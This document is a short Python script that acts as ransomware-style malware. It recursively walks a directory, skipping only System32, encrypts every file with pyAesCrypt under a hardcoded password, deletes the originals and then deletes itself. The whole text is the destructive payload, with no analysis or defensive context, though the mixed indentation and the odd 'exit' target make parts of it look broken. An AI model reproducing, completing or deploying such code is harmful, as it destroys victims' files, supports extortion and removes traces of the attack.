
import os, sys
def crypt(file):
	import pyAesCrypt
	print("---------------------------------------------------------------" )
	password="123"
	bufferSize = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
	print("[crypted] '"+str(file)+".crp'")
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir):
	    if name != 'System32':     
            path = os.path.join(dir, name)
            if os.path.isfile(path): crypt(path)
            else: walk(path)
walk("exit")
print("---------------------------------------------------------------" )
os.remove(str(sys.argv[0]))